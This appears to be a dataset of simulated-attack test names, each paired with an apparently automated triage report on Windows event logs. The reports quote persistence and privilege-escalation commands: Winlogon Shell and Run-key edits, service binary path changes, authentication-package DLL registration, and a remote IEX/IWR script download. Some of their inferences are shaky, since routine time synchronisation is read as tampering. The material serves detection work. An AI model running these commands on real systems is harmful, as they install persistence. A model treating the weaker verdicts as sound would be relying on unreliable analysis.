Domain Password Policy Check: No Number in Password,"### Detailed Analysis:

Upon analyzing the provided log entries from various Windows event logs, here is a summary of the findings:

#### System Log:
The System log entries are predominantly related to Windows Update Client activities. These logs indicate a series of updates being processed on the system:
- Update titles such as ""Microsoft.VCLibs.140.00"", ""MicrosoftWindows.CrossDevice"", and "".NET.Native.Runtime"" indicate regular update activities.
- All updates appear to be Microsoft-related, which is expected behavior and consistent with an automated update process.
  
No suspicious patterns or unusual timings were discovered in the System log entries.

#### Windows PowerShell Log:
The PowerShell logs highlight the execution of a script intended to manage user password changes. The script details:
- The use of a credential file `USERNAME.txt` in the `AppData\Local\file\` directory to store passwords.
- The script checks if the saved password matches a specified new password and will abort if it does.
- The script involves changing Active Directory account passwords using `Set-ADAccountPassword`.

Observations:
- The use of PowerShell for password management is not inherently suspicious; however, storing plaintext passwords in a file is a risky practice and may indicate poor security hygiene. This could potentially lead to credential exposure if the file is accessed by an unauthorized user.
- The script's behavior, including error handling and user feedback through command-line messages, seems functional and structured, suggesting use by an administrator familiar with scripting.

Given this context, the activity remains suspicious primarily due to the way sensitive information is handled, warranting further investigation on intent and access around these credential files.

#### Application Log:
The Application log contains a single entry related to the Software Protection Platform Service. The log entry does not indicate any anomaly or threat.

#### Sysmon Log:
The Sysmon log provides detailed process creation events:
- Multiple instances of processes such as `powershell.exe`, `conhost.exe`, `wevtutil.exe`, and others executed by the `SERVER002\admin_test` account.
- The recorded executions of `hostname.exe` and `whoami.exe` are standard and typically used for environment information gathering, possibly part of routine scripting or system checks.
- Use of `wevtutil.exe` and `conhost.exe` also appears in sequences consistent with normal Windows operations, provided there is no additional context suggesting post-exploitation activities.

No overtly malicious activity is identified within Sysmon logs given the data provided. 

### Assessment and Recommendation:
The key takeaway from this log analysis emphasizes the need to address the handling of credentials within PowerShell scripts. While no definitive signs of a compromise are present, reliance on stored plaintext passwords raises security concerns.

#### Resolution: **SUSPICIOUS**
- The activities noted, specifically around PowerShell and credential handling, suggest potential security practice deficiencies rather than direct evidence of an attack.
- Recommendations include reviewing access controls for scripts and files involved, incorporating secure password handling practices, and possibly rotating affected credentials.
- Further scrutiny is advised to ensure scripts are authorized and align with acceptable practices, especially in production environments.

Conducting a broader investigation around file access and script deployment contexts could help close any potential gaps."
Parent PID Spoofing - Spawn from New Process,"### Analysis of the Windows Event Logs

#### Overview

The logs provided for analysis include entries from Application, Windows PowerShell, and Sysmon logs, all from the computer named ""Server002"". The events are all timestamped around the same period, on October 25, 2024, and represent activities occurring almost simultaneously, suggesting a potentially scripted or programmatic execution of commands.

#### Detailed Analysis

1. **PowerShell Activity:** 
   - The PowerShell log entries (Event ID 600) indicate the execution of a PowerShell command that initiates a process (`Start-Process`) to launch `notepad.exe` and chain it with the launch of another PowerShell process that executes `Start-Sleep 10`.
   - The command involves a command line pattern resembling a testing or exploratory activity rather than outright malicious intent. However, chaining processes in such a fashion can also be used in malicious scripts, primarily when seen with attempts to hide payload execution within common system utilities.

2. **Sysmon Activity:**
   - The Sysmon logs (Event ID 5 and Event ID 1) capture process creation and termination events by the ""admin_test"" user.
   - Several entries show the execution of internal Windows utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe`, which are legitimate but can be weaponized for malicious purposes.
   - There is a consistent pattern of execution involving utilities (`wevtutil`, `conhost`, `whoami`) and their launched under the ""admin_test"" account, often used to query or manage logs, which can be part of a discovery or stealth activity by an adversary.
   - No direct manipulation or abnormal actions with these tools were observed that explicitly confirm malicious intent beyond usage patterns.

3. **Lack of Security and System Log Entries:**
   - The absence of entries in the System and Security logs could suggest clearing or alteration. However, it could also be a symptom of the provided log set being partial or log settings not encompassing activities outside the norm.

#### Assessment

- **Anomalous Behavior Observation:**
  - The chaining of processes in PowerShell, use of system utilities, and lack of comprehensive logging are unusual and suggest scripted activity. This can be typical of configuration management or automated administrative tasks but also aligns with techniques adversaries use to evade detection.

- **Indicators of Malicious Activity:**
  - Direct malicious activity is not confirmed. The activities observed could signify reconnaissance or preparation for more nefarious actions, especially if combined with broader context (e.g., unauthorized access times or off-hour activity).

### Recommended Resolution

**SUSPICIOUS**

#### Guidance on Proceeding
1. **Further Investigation:**
   - Verify the legitimacy of the 'admin_test' account actions. Check if these activities align with planned administrative tasks or scheduled jobs.
   - Scrutinize additional logs (if available) to identify preceding or subsequent irregular activities that may not be apparent within the provided log sets.
   - Consider performing a threat-hunting exercise focusing on potential lateral movement or credential misuse involving the 'admin_test' account.

2. **Monitor and Review:**
   - Increase monitoring on the server for further PowerShell script executions and command-line arguments.
   - Implement enhanced logging for PowerShell and other command executions to capture invocations with elevated privileges or suspicious patterns.

3. **Security Policies:**
   - Review group policies and application whitelisting to ensure that known good processes are well defined and deviations are flagged.

In conclusion, while not definitively malicious, the nature and set of activities exhibited suggest a necessity for continued vigilance and validation to uphold security integrity."
Winlogon Notify Key Logon Persistence - PowerShell,"Based on the provided logs, the following analysis is conducted:

**Windows PowerShell Log:**
- The PowerShell logs indicate the creation of a registry entry under `HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\file`. The properties set include a DLL (`C:\Windows\Temp\fileNotificationPackage.dll`) and other Winlogon notification settings.
- Creating and modifying registry values related to `Winlogon\Notify` is often associated with persistence mechanisms used by malware. The DLL placed in the `Temp` directory also raises suspicion, as it is common for malicious actors to use this area for temporary storage of malicious payloads.

**Security Log:**
- The time synchronization events (Event ID 4616) executed by `svchost.exe` under the LOCAL SERVICE account do not present any immediate security threat. These are normal system operations for maintaining time synchronization.

**Sysmon Log:**
- Processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` appearing together don't inherently indicate malicious activity. These are legitimate Windows processes, but their context and parent-child relationships can matter.
- The logging of PowerShell activity with command lines matching the modifications identified in the PowerShell logs further corroborates the suspicious nature of those actions. The use of PowerShell to modify the registry is common in a malicious context.

**System Log:**
- The System log mainly contains time and timezone adjustments and do not indicate any suspicious activity. Changes are processed by `svchost.exe`, which is consistent with normal operations for updating time configurations.

**Application Log:**
- There is an entry related to the Software Protection Platform Service. This event is routine and seen in normal system operations related to license management and does not indicate any malicious activity.

**Assessment:**
- The logs provide clear indications of suspicious activity due to the PowerShell logs showing modifications to the `Winlogon\Notify` registry key with a custom DLL file. This pattern matches a common method for gaining persistence on a Windows system via malware.
- Therefore, the evaluation of these logs leads to the classification of the activity as **MALICIOUS**.

**Resolution:**
1. Conduct a deeper forensic analysis on `C:\Windows\Temp\fileNotificationPackage.dll` to determine its functionality and origin.
2. Examine other hosts within the same network for similar registry alterations, particularly focusing on persistence mechanisms.
3. Consider isolating the host (Server002) to prevent potential lateral movement within the network.
4. Implement additional monitoring and alerts for PowerShell scripts and registry changes across the network to catch similar malicious activities early.
5. Review network logs for any outbound connections made by the host that could indicate data exfiltration or communication with a command-and-control server."
Simulate - Post BEC persistence via user password reset followed by user added to company administrator role,"**Analysis of the Logs:**

1. **System/Sysmon Logs:**
   - The execution of `Microsoft Edge Installer` (`EDGEMITMP_20114.tmp\setup.exe`) is likely part of a legitimate update process for Microsoft Edge. However, it's critical to ensure the path and file hash are verified against known good values to rule out any compromise of the update mechanism.
   - Multiple instances of `wevtutil.exe`, `conhost.exe`, and `powershell.exe` executables are seen across different events. While `conhost.exe` and `wevtutil.exe` can appear in normal operations, repeated and concurrent usage alongside PowerShell might be suspicious.
   - The usage of `powershell.exe` with complex command-line arguments suggests potential automation scripts being run. Key elements like `ConvertTo-SecureString` and `Connect-MsolService` indicate possible active directory operations, which may require closer inspection.
   - A particular PowerShell command involves importing modules related to Azure and Microsoft Online, and functions like resetting passwords and adding role members are evident. Such actions are highly sensitive and could indicate privilege escalation attempts if not previously authorized.

2. **Windows PowerShell Logs:**
   - PowerShell activity includes execution of scripts with modules related to `MSOnline` and `AzureAD`, involving user credential operations and role modifications, which match the observed Sysmon PowerShell events. This complex scripting might point to automation tasks, administrative actions, or illicit activity masquerading as legitimate admin tasks.

3. **Application Logs:**
   - Logs from `Software Protection Platform Service` are typical for service activation checks or updates. However, monitoring such logs helps ensure there are no unauthorized or unusual changes to software protection settings.

4. **Security Logs:**
   - Multiple `Task 4798` and `4799` events sourced from `CompatTelRunner.exe` involve group membership enumeration, which is standard for some software telemetry processes but could also be an anomaly if not aligned with expected behavior.
   - A `4624` logon event with `LogonType 5` for the SYSTEM account shows a service-start related logon, which is standard.
   - `4672` Privilege Use events for SYSTEM are legitimate as SYSTEM interacts with inherent privileges.

**Assessment and Risks:**

- **Suspicious Activity:**
  - The PowerShell script actions are significant concern: credential processing, role membership alterations, and potential unauthorized administrative activity.
  - Execution of `CompatTelRunner.exe` and its involvement in security events calls for verification to ensure it's part of planned telemetry and not exploited.

**Guidance:**

- **Resolution: SUSPICIOUS**

   There's no definitive malicious activity proven solely from the gathered logs, but the script's complexity and sensitive nature are concerning. It's vital to review the legitimacy of the scripts ran and authorization behind these actions, especially those modifying cloud or directory services.

- **Recommendations to Proceed:**
  - Validate the integrity of the `setup.exe` by verifying its hash and signature.
  - Investigate the source and purpose of the PowerShell scripts and confirm they are sanctioned by IT policy.
  - Audit the users and accounts involved in potentially sensitive operations like role assignments and check if they align with known operational tasks.
  - Seize a timeline of activities from affected systems and key log events for deeper forensic analysis.
  - Monitor for any unauthorized account modifications or access attempts in correlation with these logs."
Modify Service to Run Arbitrary Binary (Powershell),"### Detailed Analysis of the Logs:

#### Suspicious Behavior:
1. **PowerShell Activity (Windows PowerShell Log)**:
   - There is a PowerShell script being executed that performs the following:
     - Stops the ""fax"" service with the command: `Stop-Service -Name ""fax"" -force -erroraction silentlycontinue`.
     - Changes the service binary path of the ""fax"" service to Notepad: `set-servicebinarypath -name ""fax"" -path ""$env:windir\\system32\\notepad.exe""`.
     - Starts the ""fax"" service again: `start-service -Name ""fax"" -erroraction silentlycontinue`.
   - This kind of behavior is a common tactic used for privilege escalation or persistence by replacing service binaries with benign applications like Notepad.

2. **TimeChange Events (Security and System Logs)**:
   - There are several `4616` Security Event IDs indicating the system time has been changed. Time modifications can be a sign of an attempt to tamper with logs or evade detection.
   - These events are associated with the process `C:\\Windows\\System32\\svchost.exe`.

3. **Process Execution (Sysmon Log)**:
   - Several instances of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe` are run by the user `SERVER002\\admin_test`.
   - The execution of `wevtutil.exe` could indicate an attempt to query or clear event logs, which is often indicative of malicious activity.

4. **Service Changes (Application Log)**:
   - The Microsoft Fax service triggered events (`EventID: 32026 & 32068`) which align with the timeframe and manipulation observed in the PowerShell logs.

#### Assessment:
- The manipulation of the service binary path and the stopping/starting of services within PowerShell indicates probable malicious intent, particularly given that these are common techniques for maintaining persistence or privilege escalation.
- The time change events could be a further indicator of tampering attempts on the system.
- The combination of PowerShell command usage with the service alterations strongly indicates an active attempt of system compromise.

### Resolution:
- **MALICIOUS**: The logs contain evidence of suspicious activities indicative of malicious behavior. The use of PowerShell to manipulate a system service, along with potentially tampering the time logs, highly points towards an attempt to compromise the system.

### Guidance:
1. **Immediate Isolation**: Isolate the affected host (`Server002`) from the network to prevent lateral movement and further compromise.
2. **Incident Response**: Initiate a full incident response procedure, including memory and disk capture for post-breach investigation.
3. **Review Recent Changes**: Examine any recent changes in system configurations or user accounts that might indicate additional compromise.
4. **Log Analysis**: Review additional logs for any other signs of lateral movement or unauthorized access.
5. **Consider Remediation**: Once the system is thoroughly cleaned and any backdoors removed, update system settings and policies to prevent similar issues in the future (e.g., restricting PowerShell execution policies, ensuring secure log management).
"
Import XML Schedule Task with Hidden Attribute,"### Analysis of Log Entries

#### **Suspicious Activities Identified**

1. **PowerShell Activity**:
   - There are multiple PowerShell script executions involving the use of `Invoke-CimMethod` with arguments such as `-ClassName PS_ScheduledTask`, `-MethodName ""RegisterByXml""`, and reading an XML file from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.005\\src\\data_05_SCTASK_HIDDEN_ATTRIB.xml`). 
   - The fact that PowerShell is being used to perform scheduling tasks via XML inputs from a temporary location raises concerns. This behavior can be indicative of a Living-off-the-Land (LotL) technique used by attackers to establish persistence on a system by scheduling malicious tasks through native Windows utilities.
   
2. **Sysmon Events**:
   - The Sysmon log shows evidence of PowerShell being executed along with processes like `wevtutil.exe` and `conhost.exe` around the same timeframe. 
   - The use of `wevtutil.exe` could indicate log evasion tactics, as this tool can be used to clear or manage event logs on the Windows system incrementally.
   - Frequent execution of console host applications (`conhost.exe`) associated with `PowerShell.exe` further corroborates suspicious command-line activities.

3. **High Integrity Levels**:
   - Several processes are executed at a high-integrity level, which implies administrative privileges are being utilized. Such privilege may not be typical for regular tasks being run by users, indicating potential misuse of elevated privileges.

#### **Possible Threats and Risks**

- The use of PowerShell scripts with XML configurations suggests an attempt to manipulate scheduled tasks, which is a known technique for establishing persistence or executing arbitrary code.
- Execution of `wevtutil.exe` in close proximity to PowerShell activities may suggest efforts to cover tracks by modifying or clearing system logs.
- The activities occur in a narrow timeframe, consistently referencing high-integrity levels and temporary file paths, indicating orchestrated actions rather than random user behavior.

#### **Guidance for Further Actions**

- **Isolation**: Immediately isolate this host (`Server002`) from the network to prevent any potential spread or impact on connected systems.
- **In-Depth Investigation**: Conduct a deeper forensic analysis on `Server002` to review the contents of the referenced XML files and verify any scheduled tasks for unauthorized entries.
- **User Verification**: Validate user accounts with high integrity activities, especially `SERVER002\\admin_test`, to ensure these activities align with expected administrative operations or identify potential account compromise.
- **Review Persistence Mechanisms**: Check for newly created scheduled tasks or modifications to existing ones that align with the timestamp of these activities.
- **Log Management**: Ensure that log management and retention policies are in effect to prevent unauthorized deletion or modification of logs.

### Resolution

Based on the analysis of these logs, the activity observed is classified as:

- **MALICIOUS**

The PowerShell usage, in conjunction with potentially obfuscated task registration and possible log tampering, strongly suggests malicious intent and necessitates an immediate response and detailed investigation."
Shortcut Modification,"Based on the analysis of the provided Windows event logs from various logging channels such as PowerShell, Security, Application, Sysmon, and System, the following observations have been made regarding suspicious or anomalous behavior:

1. **System Time Change (Security & System Logs)**: The Security and System logs show events indicating a backward time change on the host. EventID 4616 in the Security log reflects an alteration of the system time, with the ""NewTime"" being earlier than the ""PreviousTime"". This action, performed by `svchost.exe`, though it can be legitimate, is suspicious if unexpected, as it might be leveraged by adversaries to manipulate time-dependent security mechanisms or logs.

2. **Sysmon Logs**:
   - There are multiple executions of `HOSTNAME.EXE`, `whoami.exe`, `wevtutil.exe`, and `cmd.exe` with high integrity levels by the user `SERVER002\\admin_test`. The `cmd.exe` execution is particularly noteworthy due to its command line arguments which involve creating an internet shortcut file pointing to `calc.exe`. Using cmd.exe to redirect to a seemingly harmless application like Calculator could be a technique to run unauthorized or hidden commands.
   - `wevtutil.exe` is used for managing event logs, and its execution might be normal; however, it can also be used to clear logs to cover tracks.
   - The creation and execution of internet shortcut files via command line involving `cmd.exe` and `calc.exe` appear to mimic a potentially suspicious pattern. This activity aligns with post-compromise tactics to evade detection or obfuscate intentions.

3. **Application Logs**: The EdgeUpdate logs show typical update operations, but processes like `C:\\Windows\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe` and its creation and deletion activities is a part of legitimate auto-update processes for Edge browser and related services.

4. **Overall Analysis**: 
   - The observed activity around `cmd.exe` and the unconventional use of internet shortcut files to launch `calc.exe` is suspicious. While `calc.exe` itself is not malicious, the method of execution could indicate it's being used as a decoy or misdirection in a malicious process chain.
   - The time change event, although potentially benign, when coupled with the above actions in Sysmon logs, should be investigated further to rule out any attempts at log manipulation or other timing attacks.

**Threat Assessment and Guidance**:
- Given the combination of backward time changes and suspicious command-line executions, this event collection suggests anomalous activities that need further investigation.
- Immediate actions should include determining the legitimacy of the time change, verifying the intent behind the `cmd.exe` execution, inspecting user activity (`admin_test`), checking for any signs of data exfiltration or further persistence mechanisms.

Resolution: **SUSPICIOUS** 

Further investigation is necessary, focusing especially on user `admin_test`, audit trail for the time change event, and a detailed examination of the cmd and internet shortcut behavior."
`SeDebugPrivilege` token duplication,"Below is a detailed analysis of the provided Windows event logs:

### Analysis:

1. **Process Executions:**
   - Multiple executions of `wevtutil.exe`, `conhost.exe`, and `whoami.exe` by the user `SERVER002\admin_test` with high integrity level. These tools are legitimate but can be used in malicious activities, particularly `wevtutil.exe` which can be used to manipulate or clear event logs.
   - Execution of `powershell.exe` with a command to download and execute a PowerShell script from an external source (`BC-SECURITY/Empire`). This is a strong indicator of malicious intent as it involves downloading and executing unauthorized scripts, which is a common technique used in attacks for privilege escalation or system compromise.

2. **Time Discrepancies:**
   - The security log records show events indicating the system time was altered. The time was set back by approximately 5 seconds (from ""2024-10-25 11:26:02"" to ""2024-10-25 11:25:57""). Time manipulation can be a tactic to bypass time-based security measures or to confuse log analysis.

3. **PowerShell Activity:**
   - The Windows PowerShell logs detail a session that executed the command containing `IEX` and `IWR` to fetch and execute a remote script (`Get-System.ps1`) from a third-party repository (`BC-SECURITY`), which matches patterns of downloading and executing remote code.
   - This script execution technique (`IEX (IWR`) is notorious for being used in exploitation frameworks such as PowerShell Empire for post-exploitation actions.

4. **Network Activity and Services:**
   - The system log entries show that time synchronization through `time.windows.com` is active, which may not directly relate to malicious activity but is contextually relevant when paired with the time alteration event.

### Assessment:

- **Presence of Extremely Suspicious Commands:**
  - The invocation of PowerShell to download and run a script from an external source is concerning. This is considered a potential indicator of compromise as it runs arbitrary code that is likely intended to elevate privileges or extract data from the host system.

- **Manipulation of System Time:**
  - The noted time discrepancy could potentially be a technique to confuse event timelines during forensic analysis or to evade detection systems relying on synchronized timings.

### Resolution:

- **MALICIOUS**: Based on the observed behavior especially the unauthorized PowerShell invocation containing commands to execute a script from a potentially malicious external source and the suspicious system time manipulation, these logs contain indicators of a compromise.

### Recommendations:

1. **Immediate Actions:**
   - Isolate the affected system from the network to prevent any potential spread of the compromise.
   - Conduct a full forensic investigation to determine the extent of the breach and identify any additional indicators of compromise.
   - Reset credentials, particularly for the user `admin_test`, to mitigate unauthorized access.

2. **Prevention Measures:**
   - Implement stricter controls on PowerShell execution and monitor for suspicious usage.
   - Review and harden access controls and privilege assignments for critical tools like `whoami`, `wevtutil`, and `PowerShell`.
   - Enhance logging and time synchronization security to detect and alert on time manipulations and unauthorized changes promptly.

By taking these steps, further damage can be mitigated and future occurrences can be better prevented."
Process Hollowing in Go using CreateProcessW WinAPI,"Upon reviewing the provided Windows event logs, we identified several activities. Below is my analysis:

### System Log

- The logs primarily show changes in the system time, which may be associated with legitimate system operations, such as time synchronization. The changes were executed by `svchost.exe`, which is a critical system process used for running system services.
- Time adjustments are consistent with standard behavior for systems configured to synchronize time, with references to `time.windows.com`.

### Sysmon Log

- The execution of `wevtutil.exe` and `conhost.exe` multiple times by the user `SERVER002\admin_test` is observed. `wevtutil.exe` is a utility for managing Windows event logs from the command line, which can be leveraged by administrators for log maintenance.
- The presence of `HOSTNAME.EXE` and `whoami.exe` executions through normal operations is common. Both tools are used for retrieving the system's network name and currently logged-in user, respectively.
- `powershell.exe` being called with a script in the `Temp` directory is slightly unusual. The script involves launching `werfault.exe` with debug privileges, which might suggest a debugging or automation process.

### Windows PowerShell Log

- Consistent with the Sysmon logs, PowerShell is used to execute a program located in a temporary file path. This activity can be suspicious if not accounted for in standard administrative operations.
- PowerShell activity often being attributed to administrative tasks can be benign, but given its use in launching processes from Temp directories, cautious scrutiny is advised.

### Application Log

- Nothing inherently suspicious is noted in the application log. The event refers to the standard software protection platform service.

### Security Log

- There are log entries indicating user login/logoff events, which appear normal. The logs include the privilege listing which involves advanced privileges like `SeDebugPrivilege`, typically associated with elevated roles, possibly indicating an admin user's behavior.
- The lack of direct unauthorized access attempts or security alerts further supports that no explicit malicious escalation was attempted through credentials.

### Analysis Conclusion

While there are repeated legitimate operations that might be expected on a server environment, certain aspects such as the use of PowerShell to perform tasks involving debugging and temporary paths are noteworthy. 

### Final Assessment: **SUSPICIOUS**

This designation is due to the repeated invocation of admin-level processes and PowerShell scripts executing from the `Temp` directory. While there is no explicit evidence of compromise, these activities merit further scrutiny by reviewing the scripts' source and ensuring they align with administrative intentions.

### Recommendation

- Confirm the validity of PowerShell scripts and tasks executed from temporary directories.
- Monitor log directories for any unauthorized changes.
- Ensure all administrative users are aware of safe scripting practices and avoid storing scripts in temporary or easily accessible locations.
- Consider reviewing any network connections made during the timeframe for irregularities.

Proceed with caution and further examination of administrative scripts and operations on this system to ascertain their legitimacy."
Winlogon HKLM Shell Key Persistence - PowerShell,"Upon analyzing the provided Windows event logs from a host named Server002, several key observations can be identified:

1. **Application Log:**
   - The event from the Software Protection Platform Service (SPP) appears to be typical activity related to software licensing checks. There's no evidence here of malicious activity.

2. **System Log:**
   - Notable activities include time change events performed by the `svchost.exe` process, which references time synchronization activities, likely with `time.windows.com`. This behavior is normal and supports system time maintenance.

3. **Windows PowerShell Log:**
   - The PowerShell logs indicate a script executed with the command-line arguments modifying the registry key `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`. The command sets it to `""explorer.exe, C:\\Windows\\System32\\cmd.exe"" -Force`. This is suspicious as it alters the default shell and introduces `cmd.exe` to the login shell process, which can indicate an attempt to execute a command shell upon login for elevated access.

4. **Sysmon Log:**
   - Events related to several process executions are captured, notably the invocation of `HOSTNAME.EXE`, `whoami.exe`, as well as `wevtutil.exe` and `conhost.exe`. There is a more critical entry where `powershell.exe` runs using the same command line as identified in the PowerShell log. This confirms the execution related to the registry modification associated with an illegitimate startup configuration change.

5. **Security Log:**
   - Logs reflect time changes synchronized by `svchost.exe` and confirm activities observed in the System logs.

**Assessment:**
The aspect which stands out as potentially malicious is the PowerShell command modifying the Winlogon shell registry key. This action is a common technique used to maintain persistence by running unauthorized commands or scripts at user logon. The execution of this PowerShell command, combined with how it's set in the registry, suggests an attempt to stage a persistence mechanism that involves replacing the legitimate user shell (`explorer.exe`) with a command shell, possibly for continuous unauthorized access or post-exploitation activities.

**Resolution:**
- **MALICIOUS**: Given the direct association with a known malicious technique of registry key modification to change the user shell, this activity should be classified as malicious.
  
**Recommended Action:**
1. Immediately isolate the affected system from the network to prevent potential spread or further unauthorized access.
2. Revert the registry key (`HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`) to its default value, ensuring that only `explorer.exe` is specified.
3. Conduct a thorough investigation to identify the source of the PowerShell script execution and any additional unauthorized changes.
4. Review user account activities, especially `admin_test`, since this user executed several key processes.
5. Change all passwords potentially exposed to this system and monitor network traffic for signs of further anomaly or compromise.
6. Implement or verify endpoint protection measures to prevent similar behaviors in the future."
Reg Key Run,"Upon reviewing the provided Windows event logs, here's a detailed analysis highlighting any suspicious behavior:

### Analysis:

1. **System Log**:
   - **Kernel-General & Time-Service Events**:
     - These logs indicate time synchronization activities, likely normal operations for a system using the `time.windows.com` NTP server. The process involved is `svchost.exe`, which hosts services and is commonly used for legitimate purposes.

2. **Application Log**:
   - **Security-SPP Event**:
     - The event here is related to the Software Protection Platform Service, with no peculiar activity present. This service ensures software licensing enforcement, and the timestamp indicates typical system maintenance activity.

3. **Security Log**:
   - **Event ID 4616**:
     - Indicates system time changes by the `LOCAL SERVICE`. This could be due to time synchronization as seen in the System log, consistent with regular system activities.

4. **Sysmon Log**:
   - **Process Creation and Command Line Activity**:
     - Multiple processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe` are observed.
     - The worrying sign is the execution of `cmd.exe` with a command-line that modifies the registry to add persistence by creating an auto-start entry at `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.
     - This action can be indicative of malicious behavior aiming to persist potentially harmful software.

   - **Registry Modification**:
     - The registry change commanded via `cmd.exe` and executed by `reg.exe` suggests potential compromise, as persistence mechanisms like this are commonly used in malware operations to ensure a program runs at startup.

5. **Execution of Utilities**:
   - Utilities such as `whoami.exe` and `hostname.exe` are present, often used in scripts or during manual investigations but can also be leveraged for malicious reconnaissance.

### Assessment:

- The most significant indicator of potential malicious activity is the registry modification through the `cmd.exe /c REG ADD` command. This aligns with known persistence tactics used by malware to survive reboots and maintain unauthorized access.
- The timing and context of these operations, combined with normal-looking service and system process activities, suggest a potential threat actor attempting to avoid detection.

### Resolution:

**MALICIOUS** - The presence of registry modifications aimed at enabling persistence, executed via the command line within `cmd.exe`, strongly indicates malicious intent. Immediate action should be taken to investigate the legitimacy of this change, remove it if unauthorized, and conduct a deeper forensic analysis on the host system. Additionally, monitor for any other attempts to modify critical system areas or for unusual network communication patterns that might indicate data exfiltration or further compromise."
HKLM - re-execute Internet Explorer Core Fonts' StubPath payload by decreasing version number,"Upon reviewing the provided Windows event logs, I have found several entries that may indicate suspicious activities, leading to the following analysis and conclusion:

1. **Multiple Executions of Sensitive Utilities:**
   - We observe multiple executions of `wevtutil.exe` and `conhost.exe` by the `admin_test` user within a short timeframe. These could be benign, as `wevtutil.exe` is used for managing event logs and `conhost.exe` provides a command-line interface, but frequent and consecutive use without additional context may be atypical.

2. **Unusual PowerShell Command:**
   - A PowerShell command executed by the user modifies the registry key `HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}`. This key is known for Active Setup configurations, often manipulated for persistence by malware. The command also invokes `runonce.exe` with `/AlternateShellStartup`, which is unusual and could suggest a potential persistence mechanism or script execution attempt.

3. **Execution of `whoami.exe` and `hostname.exe`:**
   - These utilities are generally harmless and used for querying system information. However, when executed in sequence with other activities, they can be components of a script or automated task related to an attack.

4. **Multiple Microsoft Edge Updates:**
   - The logs contain numerous instances of Microsoft Edge Update activities. While this could be routine, the frequency and the presence of temporary file paths (e.g., C:\Program Files (x86)\Microsoft\Temp) could imply potential tampering or obfuscation attempts. However, the versions and files involved appear legitimate upon cursory review.

5. **System Time Change:**
   - There is an adjustment of the system time, as reflected in the security logs (EventID 4616). Time changes can be performance-related or potentially indicative of attempts to manipulate time-sensitive system logs or processes.

6. **Unusual Security-Auditing Activity:**
   - A local service `svchost.exe` facilitated the time change. While not inherently malicious, the context surrounding it remains unusual, especially if unauthorized.

### Conclusion:
The logs show signs of activities that trigger suspicion, such as potential registry persistence, frequent execution of key utilities, and time manipulation. There is a lack of direct indicators proving a compromise but enough reason to warrant further investigation, particularly surrounding the usage of PowerShell, registry changes, and monitoring of user activities of `admin_test`.

### Resolution: **SUSPICIOUS**
- **Guidance:**
  - Conduct a thorough investigation into the `admin_test` account and its executed commands around the event timestamps. Review user activities and login history.
  - Analyze the specific PowerShell script further. Check for unauthorized or unexpected scripts in common directories and scheduled tasks.
  - Validate whether the Edge update processes align with standard organizational or operational practices.
  - Verify other systems for similar patterns or aberrations to ascertain if this is isolated.
"
Authentication Package,"### Detailed Analysis of the Logs

**1. System Logs:**
   - The system logs indicate a series of standard time change events. Notably, there was a sudden change in time, which can be typical in scenarios of synchronization with an external time source like an NTP server. No explicit signs of malicious intent are evident here.

**2. Sysmon Logs:**
   - The `sysmon` logs record an interesting sequence of process creations:
     - **Conhost.exe:** Multiple instances created with command line arguments `0xffffffff -ForceV1`, which is indicative of command-line or script execution activity.
     - **Wevtutil.exe:** Consistently being executed by the `admin_test` account. Frequent use of `wevtutil.exe` can be concerning if not associated with legitimate administrative tasks, as it can be used to clear or backup event logs maliciously.
     - **PowerShell Execution:** A suspicious PowerShell command is spotted:
       - `PowerShell.exe` executes a command that copies a DLL into `C:\Windows\System32\` and modifies the registry key: `Authentication Packages` to add `package.dll`. This behavior is indicative of a possible attempt to install a malicious authentication package, which can facilitate credential theft or privilege escalation.
     - **Registry (reg.exe) Execution:** The usage of `reg.exe` to modify registry settings for the `Authentication Packages` is highly suspicious and aligns with typical malicious behavior aimed at establishing persistence through DLL injection.

**3. Security Logs:**
   - Highlighted a successful login by `admin_test` with privileges such as `SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege`, and more. These elevated privileges could allow an attacker to perform potentially harmful operations like changing security configurations.

**4. PowerShell Logs:**
   - The PowerShell logs corroborate the suspicious activity identified in the `sysmon` logs related to using PowerShell to copy a DLL and modify the registry settings. This further confirms potentially malicious activity.

**5. Application Logs:**
   - Not particularly relevant to the critical components indicating malicious behavior.

### Assessment and Conclusion
Based on the detailed investigation of the logs:

- The execution of PowerShell commands modifying critical registry keys to potentially load unauthorized or malicious modules.
- The presence of a copy operation into `C:\Windows\System32\` through scripting, which is typically protected.
- Continuous use of `wevtutil.exe` by a non-standard user account in concurrence with suspicious activity.
- Registry modifications using `reg.exe`.

All of these activities, especially when considered together, indicate that the logs contain strong **malicious activity** related to potential unauthorized persistence mechanisms and possible preparation for credential theft.

### Resolution
**Resolution: MALICIOUS**

### Guidance
Immediate remediation steps should be undertaken:
- Isolate the affected host to prevent further malicious activity or potential exfiltration.
- Conduct a full forensic analysis to understand the impact, including identifying any additional signs of compromise.
- Remove the unauthorized DLLs and rollback any unsanctioned registry changes.
- Strengthen credential access controls and evaluate the need for any password changes for potentially exposed accounts.
- Review user permissions and consider revoking unnecessary elevated privileges.
- Ensure all systems are adequately patched and up to date to prevent exploitation of known vulnerabilities."
LockBit Black - Modify Group policy settings -Powershell,"### Analysis of the Provided Windows Event Logs

#### Sysmon Log Analysis
- **Suspicious PowerShell Activity**:
  - The usage of `powershell.exe` to modify registry keys related to Group Policy and SmartScreen settings is suspicious. PowerShell can be leveraged for scripting various administrative tasks, but the modifications to registry keys typically related to security settings (like SmartScreen) might indicate an attempt to disable security features.
  - The command executed:
    ```
    powershell.exe & {New-ItemProperty \""HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\"" ... -Force}
    ```
  - This indicates potential weakening of security postures on the host.

- **Frequent Execution of `wevtutil.exe` by `admin_test`**:
